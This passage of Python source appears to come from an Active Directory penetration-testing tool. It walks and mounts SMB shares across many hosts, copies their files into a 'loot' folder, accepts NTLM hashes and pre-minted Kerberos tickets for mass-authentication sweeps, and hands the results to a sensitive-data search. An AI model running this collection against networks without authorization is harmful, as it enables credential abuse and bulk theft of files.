    rclone_path = _ensure_rclone_available(shell)
    if not rclone_path:
        return {
            "success": False,
            "copied_targets": 0,
            "failed_targets": len(grouped_remote_paths),
        }
    if not _is_rclone_supported_for_smb_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
    ):
        print_warning_debug(
            f"Skipping rclone {operation_label}: "
            f"{_get_rclone_unsupported_smb_auth_reason(shell, domain=domain, username=username, password=password)}"
        )
        return {
            "success": False,
            "copied_targets": 0,
            "failed_targets": len(grouped_remote_paths),
        }

    service = RcloneShareMappingService()
    transport_username, transport_password, transport_domain = (
        _resolve_rclone_transport_auth(
            shell,
            domain=domain,
            username=username,
            password=password,
        )
    )
    obscured_password = service.obscure_password(
        command_executor=shell.run_command,
        rclone_path=rclone_path,
        password=transport_password,
    )
    if transport_password and obscured_password == "":
        print_warning(
            f"rclone could not obscure the SMB password. Skipping rclone {operation_label}."
        )
        return {
            "success": False,
            "copied_targets": 0,
            "failed_targets": len(grouped_remote_paths),
        }

    tuning = choose_rclone_tuning(
        target_count=len(grouped_remote_paths),
        mostly_small_files=mostly_small_files,
    )
    copied_targets = 0
    failed_targets = 0
    partial_targets = 0
    print_info_debug(
        f"rclone {operation_label} tuning: "
        f"targets={len(grouped_remote_paths)} workers={tuning.target_workers} "
        f"transfers={tuning.transfers} checkers={tuning.checkers} "
        f"buffer_size={tuning.buffer_size}"
    )

    def _download_one_target(
        target: tuple[tuple[str, str], list[str]],
    ) -> dict[str, Any]:
        (host, share), remote_paths = target
        if not remote_paths:
            return {"status": "skipped", "host": host, "share": share, "rc": 0}
        remote = service.build_smb_remote(
            host=host,
            share=share,
            username=transport_username,
            obscured_password=obscured_password,
            domain=transport_domain,
        )
        manifest_path = _write_rclone_files_from_manifest(
            manifest_dir=manifest_dir,
            host=host,
            share=share,
            remote_paths=remote_paths,
        )
        target_loot_dir = os.path.join(loot_dir, host, share)
        os.makedirs(target_loot_dir, exist_ok=True)
        command = _build_rclone_copy_files_from_command(
            rclone_path=rclone_path,
            remote=remote,
            destination_dir=target_loot_dir,
            files_from_path=manifest_path,
            tuning=tuning,
            max_size_bytes=max_size_bytes,
        )
        print_info_debug(
            f"rclone {operation_label} download command: "
            f"host={mark_sensitive(host, 'host')} share={mark_sensitive(share, 'share')} "
            f"command={command}"
        )
        rclone_env = service.build_rclone_env(obscured_password)
        run_kwargs: dict[str, Any] = {"timeout": 1200, "ignore_errors": True}
        if rclone_env is not None:
            run_kwargs["env"] = rclone_env
        result = shell.run_command(command, **run_kwargs)
        copied_file_count = _count_files_under_path(target_loot_dir)
        if result is None:
            return {"status": "failed", "host": host, "share": share, "rc": None}
        return_code = int(getattr(result, "returncode", 1))
        if return_code == 0:
            return {"status": "copied", "host": host, "share": share, "rc": return_code}
        if copied_file_count > 0:
            return {
                "status": "partial",
                "host": host,
                "share": share,
                "rc": return_code,
            }
        return {"status": "failed", "host": host, "share": share, "rc": return_code}

    if grouped_remote_paths:
        with ThreadPoolExecutor(max_workers=tuning.target_workers) as executor:
            futures = {
                executor.submit(_download_one_target, item): item
                for item in grouped_remote_paths.items()
            }
            for future in as_completed(futures):
                result = future.result()
                status = str(result.get("status", "failed"))
                host = str(result.get("host", ""))
                share = str(result.get("share", ""))
                rc = result.get("rc")
                if status in {"copied", "skipped"}:
                    if status == "copied":
                        copied_targets += 1
                    continue
                if status == "partial":
                    partial_targets += 1
                    copied_targets += 1
                    print_warning_debug(
                        f"rclone {operation_label} target returned non-zero after partial download: "
                        f"host={host} share={share} rc={rc}"
                    )
                    continue
                failed_targets += 1
                print_warning_debug(
                    f"rclone {operation_label} target download failed: "
                    f"host={host} share={share} rc={rc}"
                )

    return {
        "success": copied_targets > 0 or (not grouped_remote_paths),
        "copied_targets": copied_targets,
        "partial_targets": partial_targets,
        "failed_targets": failed_targets,
    }


def _count_files_under_path(root_path: str) -> int:
    """Count visible files under a local directory tree."""
    total = 0
    root = Path(root_path)
    for dirpath, dirnames, filenames in os.walk(root_path):
        prune_excluded_walk_dirs(dirnames)
        base_dir = Path(dirpath)
        for filename in filenames:
            file_path = base_dir / filename
            try:
                relative_path = file_path.relative_to(root).as_posix()
            except ValueError:
                continue
            if is_globally_excluded_smb_relative_path(relative_path):
                continue
            total += 1
    return total


def _list_files_under_path(root_path: str) -> list[str]:
    """Return stable file list under one local directory tree."""
    files: list[str] = []
    root = Path(root_path)
    for dirpath, dirnames, filenames in os.walk(root_path):
        prune_excluded_walk_dirs(dirnames)
        for filename in sorted(filenames):
            file_path = Path(dirpath) / filename
            try:
                relative_path = file_path.relative_to(root).as_posix()
            except ValueError:
                continue
            if is_globally_excluded_smb_relative_path(relative_path):
                continue
            files.append(str(file_path))
    return files


def _resolve_rclone_transport_auth(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> tuple[str, str, str]:
    """Resolve the effective SMB auth context for rclone backends.

    ``rclone`` null sessions must omit all auth fields from the SMB remote, so
    this returns empty transport credentials/domain for logical ``null``.
    Guest sessions keep an empty password but switch to the configured guest
    transport username shared with the rest of the SMB stack.
    """
    normalized_username = str(username or "").strip()
    normalized_password = str(password or "")
    lowered_username = normalized_username.lower()
    if lowered_username == "null":
        return "null", "", ""
    if is_guest_alias(lowered_username) and normalized_password == "":
        return resolve_smb_guest_username(shell=shell, domain=domain), "", domain
    return normalized_username, normalized_password, domain


def _is_null_session_smb_auth(
    shell: Any,
    *,
    domain: str | None,
    username: str | None,
) -> bool:
    """Return True when the effective SMB auth context is a null session."""
    normalized_username = str(username or "").strip().lower()
    if normalized_username == "null":
        return True
    if normalized_username:
        return False
    if domain and isinstance(getattr(shell, "domains_data", None), dict):
        domain_auth = (
            str(
                shell.domains_data.get(domain, {}).get("auth", "")  # type: ignore[index]
                or ""
            )
            .strip()
            .lower()
        )
        return domain_auth == "null"
    return False


def _normalize_sensitive_data_method_for_smb_auth(
    shell: Any,
    *,
    domain: str | None,
    username: str | None,
    password: str | None = None,
    selected_method: str | None,
) -> str | None:
    """Normalize unsupported SMB analysis methods for the current auth context."""

    def _classify_unsupported_auth() -> str:
        if _is_null_session_smb_auth(shell, domain=domain, username=username):
            return "null_session"
        if (
            password
            and callable(getattr(shell, "is_hash", None))
            and shell.is_hash(password)
        ):
            return "hash"
        return "supported"

    def _describe_method(method: str) -> str:
        labels = {
            "ai_rclone": "AI-assisted rclone mapping",
            "ai": "AI-assisted native SMB walk mapping",
            "deterministic_rclone_direct": "deterministic rclone direct analysis",
            "deterministic_rclone_mapped": "deterministic rclone mapped analysis",
            "deterministic_manspider": "deterministic manspider analysis",
        }
        return labels.get(method, method)

    def _announce_once(
        original_method: str, normalized_method: str, reason: str
    ) -> None:
        cache = getattr(shell, "_smb_sensitive_auth_normalization_notices", None)
        if not isinstance(cache, set):
            cache = set()
            setattr(shell, "_smb_sensitive_auth_normalization_notices", cache)
        notice_key = (
            str(domain or "").strip().lower(),
            str(original_method).strip(),
            str(normalized_method).strip(),
        )
        if notice_key in cache:
            return
        cache.add(notice_key)
        marked_domain = mark_sensitive(str(domain or "unknown"), "domain")
        marked_original = mark_sensitive(_describe_method(original_method), "text")
        marked_normalized = mark_sensitive(_describe_method(normalized_method), "text")
        auth_kind = _classify_unsupported_auth()
        print_info_debug(
            "SMB auth compatibility fallback selected: "
            f"domain={marked_domain} auth_kind={mark_sensitive(auth_kind, 'text')} "
            f"requested_method={marked_original} normalized_method={marked_normalized} "
            f"reason={mark_sensitive(reason, 'text')}"
        )
        telemetry.capture(
            "smb_sensitive_auth_normalized",
            {
                "domain": str(domain or "").strip().lower() or "unknown",
                "auth_kind": auth_kind,
                "requested_method": str(original_method).strip(),
                "normalized_method": str(normalized_method).strip(),
                "reason": reason,
                "workspace_type": str(getattr(shell, "type", "") or "").strip().lower()
                or "unknown",
                "auto_mode": bool(getattr(shell, "auto", False)),
            },
        )
        print_info(
            f"{reason} Using {marked_normalized} instead of {marked_original} "
            f"for domain {marked_domain}."
        )

    normalized_method = str(selected_method or "").strip()
    if not normalized_method:
        return selected_method
    unsupported_reason = _get_rclone_unsupported_smb_auth_reason(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    if not unsupported_reason:
        return selected_method
    if normalized_method == "ai_rclone":
        _announce_once(
            "ai_rclone",
            "ai",
            unsupported_reason,
        )
        return "ai"
    if normalized_method in {
        "deterministic_rclone_direct",
        "deterministic_rclone_mapped",
    }:
        _announce_once(
            normalized_method,
            "deterministic_manspider",
            unsupported_reason,
        )
        return "deterministic_manspider"
    return selected_method


def _is_rclone_supported_for_smb_auth(
    shell: Any,
    *,
    domain: str | None,
    username: str | None,
    password: str | None = None,
) -> bool:
    """Return True when rclone SMB backend supports the requested auth mode."""
    if _is_null_session_smb_auth(shell, domain=domain, username=username):
        return False
    if (
        password
        and callable(getattr(shell, "is_hash", None))
        and shell.is_hash(password)
    ):
        return False
    return True


def _get_rclone_unsupported_smb_auth_reason(
    shell: Any,
    *,
    domain: str | None,
    username: str | None,
    password: str | None = None,
) -> str:
    """Return one user-facing reason when rclone SMB cannot use the current auth material."""
    if _is_null_session_smb_auth(shell, domain=domain, username=username):
        return "SMB null-session auth is not supported by the rclone SMB backend."
    if (
        password
        and callable(getattr(shell, "is_hash", None))
        and shell.is_hash(password)
    ):
        return (
            "rclone SMB does not support pass-the-hash / NTLM-hash authentication; "
            "it requires a plaintext password for the inline SMB remote."
        )
    return ""


def _slugify_token(token: str) -> str:
    """Return a filesystem-safe token for output folder naming."""
    slug = re.sub(r"[^a-zA-Z0-9_.-]+", "_", token or "").strip("_")
    return slug or "unknown"


def _resolve_cifs_mount_root(
    *,
    shell: Any,
    domain: str,
) -> str:
    """Resolve CIFS mount root path from shell/env/default workspace path."""
    configured_root = str(getattr(shell, "smb_cifs_mount_root", "") or "").strip()
    env_root = os.getenv("ADSCAN_SMB_CIFS_MOUNT_ROOT", "").strip()
    workspace_cwd = shell._get_workspace_cwd()
    default_root = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "mounts",
    )

    for candidate in [configured_root, env_root, default_root]:
        if not candidate:
            continue
        if os.path.isdir(candidate):
            return os.path.abspath(candidate)
    return os.path.abspath(configured_root or env_root or default_root)


def _resolve_cifs_aggregate_map_path(
    *,
    shell: Any,
    domain: str,
) -> str:
    """Resolve the consolidated CIFS mapping JSON path for one domain."""
    workspace_cwd = shell._get_workspace_cwd()
    return domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "share_tree_map.json",
    )


def _resolve_cifs_host_share_targets(
    *,
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None,
) -> list[tuple[str, str]]:
    """Resolve host/share targets for CIFS mount attempts."""
    targets: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()

    if isinstance(share_map, dict):
        for host, host_shares in share_map.items():
            host_name = str(host or "").strip()
            if not host_name or not isinstance(host_shares, dict):
                continue
            for share, perms in host_shares.items():
                share_name = str(share or "").strip()
                perms_text = str(perms or "").strip().lower()
                if (
                    not share_name
                    or _is_globally_excluded_mapping_share(share_name)
                    # Include any share with READ or WRITE access — WRITE implies
                    # READ on Windows, and the share_map may store "READ_WRITE"
                    # or "WRITE" for shares with write access.
                    or not any(p in perms_text for p in ("read", "write"))
                ):
                    continue
                key = (host_name.lower(), share_name.lower())
                if key in seen:
                    continue
                seen.add(key)
                targets.append((host_name, share_name))

    if targets:
        return targets

    for host in hosts:
        host_name = str(host or "").strip()
        if not host_name:
            continue
        for share in shares:
            share_name = str(share or "").strip()
            if not share_name or _is_globally_excluded_mapping_share(share_name):
                continue
            key = (host_name.lower(), share_name.lower())
            if key in seen:
                continue
            seen.add(key)
            targets.append((host_name, share_name))
    return targets


def _mount_cifs_targets_via_host_helper(
    *,
    domain: str,
    username: str,
    password: str,
    mount_root: str,
    targets: list[tuple[str, str]],
) -> list[str]:
    """Best-effort CIFS share mounts via host-helper; returns mountpoints to cleanup."""
    helper_sock = os.getenv("ADSCAN_HOST_HELPER_SOCK", "").strip()
    if not helper_sock or not os.path.exists(helper_sock):
        marked_sock = mark_sensitive(helper_sock or "<unset>", "path")
        print_info_debug(
            f"CIFS host-helper mount skipped: missing helper socket ({marked_sock})."
        )
        return []

    try:
        from adscan_internal.host_privileged_helper import host_helper_client_request
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            "CIFS host-helper mount skipped: could not import host helper client."
        )
        return []

    mounted_points: list[str] = []
    mounted_count = 0
    already_mounted_count = 0
    mounted_new_count = 0
    reused_same_identity_count = 0
    reused_existing_mount_count = 0
    remounted_due_to_identity_change_count = 0
    failed_count = 0

    for host, share in targets:
        marked_host = mark_sensitive(host, "hostname")
        marked_share = mark_sensitive(share, "service")
        try:
            resp = host_helper_client_request(
                helper_sock,
                op="cifs_mount_share",
                payload={
                    "host": host,
                    "share": share,
                    "mount_root": mount_root,
                    "username": username,
                    "password": password,
                    "domain": domain,
                    "read_only": True,
                },
                timeout_seconds=180,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            failed_count += 1
            print_warning_debug(
                "CIFS host-helper mount request failed: "
                f"host={marked_host} share={marked_share} "
                f"error={type(exc).__name__}: {exc}"
            )
            continue
        if not resp.ok:
            failed_count += 1
            print_warning_debug(
                "CIFS host-helper mount failed: "
                f"host={marked_host} share={marked_share} "
                f"message={resp.message or '-'} rc={resp.returncode}"
            )
            continue

        mount_point = ""
        mounted_by_helper = False
        reuse_status = ""
        remounted_due_to_identity_change = False
        try:
            payload = json.loads(resp.stdout or "{}")
            mount_point = str(payload.get("mount_point", "")).strip()
            mounted_by_helper = bool(payload.get("mounted_by_helper", False))
            reuse_status = str(payload.get("reuse_status", "") or "").strip()
            remounted_due_to_identity_change = bool(
                payload.get("remounted_due_to_identity_change", False)
            )
        except Exception:
            mount_point = ""
            mounted_by_helper = False
            reuse_status = ""
            remounted_due_to_identity_change = False

        if mounted_by_helper and mount_point:
            mounted_count += 1
            mounted_points.append(mount_point)
            marked_mount_point = mark_sensitive(mount_point, "path")
            if remounted_due_to_identity_change:
                remounted_due_to_identity_change_count += 1
                print_info_debug(
                    "CIFS host-helper remounted share due to auth context change: "
                    f"host={marked_host} share={marked_share} "
                    f"mount_point={marked_mount_point}"
                )
            else:
                mounted_new_count += 1
                print_info_debug(
                    "CIFS host-helper mounted new share: "
                    f"host={marked_host} share={marked_share} "
                    f"mount_point={marked_mount_point}"
                )
        else:
            already_mounted_count += 1
            if reuse_status == "reused_same_identity":
                reused_same_identity_count += 1
                marked_mount_point = mark_sensitive(mount_point or "<unknown>", "path")
                print_info_debug(
                    "CIFS host-helper reused existing mount with matching auth context: "
                    f"host={marked_host} share={marked_share} "
                    f"mount_point={marked_mount_point}"
                )
            elif reuse_status == "reused_existing_mount":
                reused_existing_mount_count += 1
                marked_mount_point = mark_sensitive(mount_point or "<unknown>", "path")
                print_info_debug(
                    "CIFS host-helper reused existing mount without identity metadata: "
                    f"host={marked_host} share={marked_share} "
                    f"mount_point={marked_mount_point}"
                )

    marked_root = mark_sensitive(mount_root, "path")
    print_info_debug(
        "CIFS host-helper mount summary: "
        f"mount_root={marked_root} targets={len(targets)} "
        f"mounted={mounted_count} mounted_new={mounted_new_count} "
        f"already_mounted={already_mounted_count} "
        f"reused_same_identity={reused_same_identity_count} "
        f"reused_existing_mount={reused_existing_mount_count} "
        f"remounted_due_to_identity_change={remounted_due_to_identity_change_count} "
        f"failed={failed_count}"
    )
    return mounted_points


def _unmount_cifs_targets_via_host_helper(
    *,
    mount_points: list[str],
) -> None:
    """Best-effort unmount of CIFS targets previously mounted by host-helper."""
    if not mount_points:
        return

    helper_sock = os.getenv("ADSCAN_HOST_HELPER_SOCK", "").strip()
    if not helper_sock or not os.path.exists(helper_sock):
        marked_sock = mark_sensitive(helper_sock or "<unset>", "path")
        print_warning_debug(
            f"CIFS unmount skipped: host helper socket unavailable ({marked_sock})."
        )
        return

    try:
        from adscan_internal.host_privileged_helper import host_helper_client_request
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug("CIFS unmount skipped: cannot import host helper client.")
        return

    unmounted = 0
    failed = 0
    for mount_point in mount_points:
        try:
            resp = host_helper_client_request(
                helper_sock,
                op="cifs_unmount_share",
                payload={"mount_point": mount_point, "lazy": True},
                timeout_seconds=90,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            failed += 1
            marked_mount = mark_sensitive(mount_point, "path")
            print_warning_debug(
                "CIFS unmount request raised exception: "
                f"mount_point={marked_mount} error={type(exc).__name__}: {exc}"
            )
            continue
        if resp.ok:
            unmounted += 1
        else:
            failed += 1
            marked_mount = mark_sensitive(mount_point, "path")
            print_warning_debug(
                "CIFS unmount failed: "
                f"mount_point={marked_mount} message={resp.message or '-'} "
                f"rc={resp.returncode}"
            )

    print_info_debug(
        "CIFS unmount summary: "
        f"requested={len(mount_points)} unmounted={unmounted} failed={failed}"
    )


def run_smb_share_tree_mapping_with_cifs(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    cifs_mount_root: str | None = None,
    selected_method: str | None = None,
    run_post_mapping_workflow: bool = True,
) -> bool:
    """Map SMB share trees from CIFS mount paths and run post-mapping workflow."""
    from adscan_internal.services.cifs_share_mapping_service import (
        CIFSShareMappingService,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService

    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)

    if not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"No SMB hosts available for CIFS mapping in domain {marked_domain}."
        )
        return False
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No SMB shares eligible for CIFS mapping after applying global "
            f"exclusions in {marked_domain}."
        )
        return False

    effective_mount_root = str(
        cifs_mount_root or ""
    ).strip() or _resolve_cifs_mount_root(
        shell=shell,
        domain=domain,
    )
    marked_mount_root = mark_sensitive(effective_mount_root, "path")
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            "CIFS host-helper mount orchestration failed unexpectedly; continuing "
            "with pre-existing mount state."
        )

    if not os.path.isdir(effective_mount_root):
        print_warning(
            "CIFS mapping root is not accessible. "
            f"Expected mounted content at {marked_mount_root}."
        )
        print_warning(
            "Fallback recommendation: use spider_plus + AI or deterministic mode."
        )
        _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        return False

    workspace_cwd = shell._get_workspace_cwd()
    cifs_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
    )
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_id = f"cifs_{timestamp}_{_slugify_token(username)}"
    run_folder = f"{timestamp}_{_slugify_token(username)}"
    run_output_abs = os.path.join(cifs_root_abs, "runs", run_folder)
    os.makedirs(run_output_abs, exist_ok=True)
    aggregate_map_abs = os.path.join(cifs_root_abs, "share_tree_map.json")
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "share_tree_map.json",
    )
    marked_aggregate_rel = mark_sensitive(aggregate_map_rel, "path")

    try:
        print_operation_header(
            "SMB Share Tree Mapping (CIFS)",
            details={
                "Domain": mark_sensitive(domain, "domain"),
                "Principal": mark_sensitive(username, "user"),
                "Hosts": str(len(hosts)),
                "Readable Shares": str(len(shares)),
                "CIFS Root": marked_mount_root,
                "Run Output": mark_sensitive(run_output_abs, "path"),
                "Aggregate JSON": marked_aggregate_rel,
            },
            icon="🗺️",
        )
        cifs_service = CIFSShareMappingService()
        mapping_result = cifs_service.generate_host_metadata_json(
            mount_root=effective_mount_root,
            run_output_dir=run_output_abs,
            hosts=hosts,
            shares=shares,
        )

        service = ShareMappingService()
        principal_label = f"{domain}\\{username}"
        summary = service.merge_spider_plus_run(
            domain=domain,
            principal=principal_label,
            run_id=run_id,
            run_output_dir=run_output_abs,
            aggregate_map_path=aggregate_map_abs,
            requested_hosts=hosts,
            requested_shares=shares,
            host_share_permissions=share_map,
        )

        host_json_count = int(summary.get("host_json_files", 0))
        merged_files = int(summary.get("merged_file_entries", 0))
        mapped_shares = int(mapping_result.get("mapped_shares", 0))
        if host_json_count == 0:
            print_warning(
                "CIFS mapping found no host metadata files to consolidate. "
                "Verify mount structure host/share/path."
            )
        else:
            print_success(
                f"CIFS share mapping updated with {host_json_count} host file(s), "
                f"{mapped_shares} mapped share(s), and {merged_files} file metadata entries."
            )
        print_info(f"Consolidated SMB share tree map saved to {marked_aggregate_rel}.")
        if run_post_mapping_workflow:
            _run_post_mapping_sensitive_data_workflow(
                shell,
                domain=domain,
                aggregate_map_abs=aggregate_map_abs,
                aggregate_map_rel=aggregate_map_rel,
                shares=shares,
                hosts=hosts,
                share_map=share_map,
                triage_username=username,
                triage_password=password,
                selected_method=selected_method,
                cifs_mount_root=effective_mount_root,
            )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error while executing CIFS SMB share mapping.")
        print_exception(show_locals=False, exception=exc)
        print_error_debug(traceback.format_exc())
        return False
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                "CIFS unmount cleanup failed unexpectedly after mapping workflow."
            )


# ---------------------------------------------------------------------------
# Native SMB share-tree walk — replaces the retired NetExec ``spider_plus``
# module. Reuses the same aiosmb recursive-walk primitive
# (``SMBDirectory.list_r``) the DPAPI / GPP / CTF collectors use, seeded by the
# shares the collector / share-view already enumerated (no re-enumeration, no
# subprocess). It writes the SAME per-host JSON artifact spider_plus produced
# (``{share: {relative_path: {size, ctime_epoch, mtime_epoch, atime_epoch}}}``),
# so ``ShareMappingService.merge_spider_plus_run`` and the entire downstream
# post-mapping sensitive-data workflow are unchanged. The ``spider_plus`` name
# survives ONLY as the on-disk storage-bucket / JSON-schema identifier.
# ---------------------------------------------------------------------------

# Bounded traversal for enterprise-scale share trees: a generous depth plus a
# per-host file cap and per-share / per-host time budget so one pathological
# share can never starve the sweep.
_SHARE_TREE_WALK_MAX_DEPTH = 12
_SHARE_TREE_WALK_MAX_FILES_PER_HOST = 20000
_SHARE_TREE_WALK_PER_SHARE_TIMEOUT_SECONDS = 180.0
_SHARE_TREE_WALK_PER_HOST_TIMEOUT_SECONDS = 900.0


def _epoch_seconds_str(value: Any) -> str:
    """Format an SMB FILETIME datetime into spider_plus-compatible epoch text."""
    try:
        if value is None:
            return ""
        return str(int(value.timestamp()))
    except Exception:  # noqa: BLE001
        return ""


def _resolve_share_tree_walk_credential(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> tuple[str, str, bool]:
    """Resolve the effective ``(username, credential, is_anonymous)`` for the walk.

    Mirrors the auth normalisation the retired ``_build_spider_plus_auth`` did:
    ``null`` -> anonymous null session; a guest alias with an empty password ->
    the configured guest transport principal; everything else passes through.
    """
    lowered = username.strip().lower()
    if lowered == "null":
        return "", "", True
    if is_guest_alias(lowered) and password == "":
        return resolve_smb_guest_username(shell=shell, domain=domain), "", True
    return username, password, False


async def _native_walk_host_share_tree(
    *,
    connection: Any,
    host: str,
    shares: list[str],
    max_depth: int,
    max_files: int,
    per_share_timeout: float,
) -> tuple[dict[str, dict[str, dict[str, str]]], int]:
    """Recursively walk one host's shares and return spider_plus-shaped metadata."""
    import asyncio

    from aiosmb.commons.interfaces.directory import SMBDirectory

    host_payload: dict[str, dict[str, dict[str, str]]] = {}
    files_seen = 0

    for share in shares:
        share_name = str(share or "").strip().strip("\\/")
        if not share_name:
            continue
        uncroot = f"\\\\{host}\\{share_name}"
        files_map: dict[str, dict[str, str]] = {}

        async def _walk_share(unc: str, dest: dict[str, dict[str, str]]) -> None:
            nonlocal files_seen
            try:
                root_dir = SMBDirectory.from_uncpath(unc)
            except Exception as exc:  # noqa: BLE001
                print_info_debug(
                    "share-tree walk from_uncpath failed for "
                    f"{mark_sensitive(unc, 'path')}: {type(exc).__name__}"
                )
                return
            async for path, otype, err in root_dir.list_r(connection, depth=max_depth):
                if files_seen >= max_files:
                    return
                if err is not None or otype != "file":
                    continue
                relative_path = (
                    str(getattr(path, "fullpath", "") or "")
                    .replace("\\", "/")
                    .strip("/")
                )
                if not relative_path:
                    continue
                if is_globally_excluded_smb_relative_path(relative_path):
                    continue
                dest[relative_path] = {
                    "size": _format_size_human(int(getattr(path, "size", 0) or 0)),
                    "ctime_epoch": _epoch_seconds_str(
                        getattr(path, "creation_time", None)
                    ),
                    "mtime_epoch": _epoch_seconds_str(
                        getattr(path, "last_write_time", None)
                    ),
                    "atime_epoch": _epoch_seconds_str(
                        getattr(path, "last_access_time", None)
                    ),
                }
                files_seen += 1

        try:
            await asyncio.wait_for(
                _walk_share(uncroot, files_map), timeout=per_share_timeout
            )
        except asyncio.TimeoutError:
            print_info_debug(
                "share-tree walk exceeded the per-share time budget on "
                f"{mark_sensitive(uncroot, 'path')} "
                f"({per_share_timeout:.0f}s); keeping partial results"
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                "share-tree walk error on "
                f"{mark_sensitive(uncroot, 'path')}: {type(exc).__name__}"
            )

        if files_map:
            host_payload[share_name] = files_map
        if files_seen >= max_files:
            break

    return host_payload, files_seen


async def _native_build_share_tree_host_json(
    shell: Any,
    *,
    domain: str,
    hosts: list[str],
    shares: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
    run_output_dir: str,
    timeout: int = 30,
) -> dict[str, Any]:
    """Walk every host's readable shares natively and write per-host JSON files.

    Produces the exact per-host ``{host}.json`` artifact
    ``ShareMappingService.merge_spider_plus_run`` consumes. Authenticates as a
    single principal across many hosts, so the credential is pre-minted ONCE via
    ``resolve_sweep_credential`` (domain-lockout / AS-REQ scale safety); a failed
    pre-mint aborts the sweep instead of spraying the secret per host.
    """
    import asyncio

    from adscan_internal.cli.smb_shares_view import _build_smb_config_for_host
    from adscan_internal.services.smb_transport import smb_machine_with_fallback
    from adscan_internal.services.sweep_credential import resolve_sweep_credential
    from adscan_internal.workspaces import write_json_file

    os.makedirs(run_output_dir, exist_ok=True)

    eff_user, eff_cred, is_anonymous = _resolve_share_tree_walk_credential(
        shell, domain=domain, username=username, password=password
    )

    # Mass-auth sweep: pre-mint one TGT and reuse the ccache across all hosts.
    if not is_anonymous and eff_user and eff_cred:
        is_hash = bool(
            callable(getattr(shell, "is_hash", None)) and shell.is_hash(eff_cred)
        )
        sweep = resolve_sweep_credential(
            shell,
            domain=domain,
            username=eff_user,
            password=None if is_hash else eff_cred,
            nt_hash=eff_cred if is_hash else None,
        )
        if sweep.aborted:
            return {
                "host_json_files": 0,
                "aborted": True,
                "abort_reason": sweep.abort_reason or "credential pre-mint failed",
            }
        if sweep.ccache_path:
            eff_cred = sweep.ccache_path

    host_json_files = 0
    walked_hosts = 0
    total_files = 0

    for host in hosts:
        host_key = str(host or "").strip()
        if not host_key:
            continue

        walk_shares: list[str] = []
        if isinstance(share_map, dict):
            host_shares = share_map.get(host_key)
            if isinstance(host_shares, dict) and host_shares:
                walk_shares = _filter_shares_by_global_mapping_exclusions(
                    list(host_shares.keys())
                )
        if not walk_shares:
            walk_shares = list(shares)
        if not walk_shares:
            continue

        try:
            config = _build_smb_config_for_host(
                shell=shell,
                domain=domain,
                target_host=host_key,
                timeout=timeout,
                username_override=eff_user,
                credential_override=eff_cred,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                "share-tree walk could not build SMB config for "
                f"{mark_sensitive(host_key, 'hostname')}: {type(exc).__name__}"
            )
            continue

        async def _drive(cfg: Any, target: str, tgt_shares: list[str]):
            async with smb_machine_with_fallback(cfg) as machine:
                return await _native_walk_host_share_tree(
                    connection=machine.connection,
                    host=target,
                    shares=tgt_shares,
                    max_depth=_SHARE_TREE_WALK_MAX_DEPTH,
                    max_files=_SHARE_TREE_WALK_MAX_FILES_PER_HOST,
                    per_share_timeout=_SHARE_TREE_WALK_PER_SHARE_TIMEOUT_SECONDS,
                )

        try:
            host_payload, files_seen = await asyncio.wait_for(
                _drive(config, host_key, walk_shares),
                timeout=_SHARE_TREE_WALK_PER_HOST_TIMEOUT_SECONDS,
            )
        except asyncio.TimeoutError:
            print_info_debug(
                "share-tree walk exceeded the per-host time budget on "
                f"{mark_sensitive(host_key, 'hostname')}"
            )
            continue
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                "share-tree walk failed to connect to "
                f"{mark_sensitive(host_key, 'hostname')}: {type(exc).__name__}"
            )
            continue

        walked_hosts += 1
        total_files += files_seen
        if host_payload:
            write_json_file(
                os.path.join(run_output_dir, f"{host_key}.json"), host_payload
            )
            host_json_files += 1

    return {
        "host_json_files": host_json_files,
        "walked_hosts": walked_hosts,
        "total_files": total_files,
        "aborted": False,
    }


def run_smb_share_tree_mapping_with_spider_plus(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    selected_method: str | None = None,
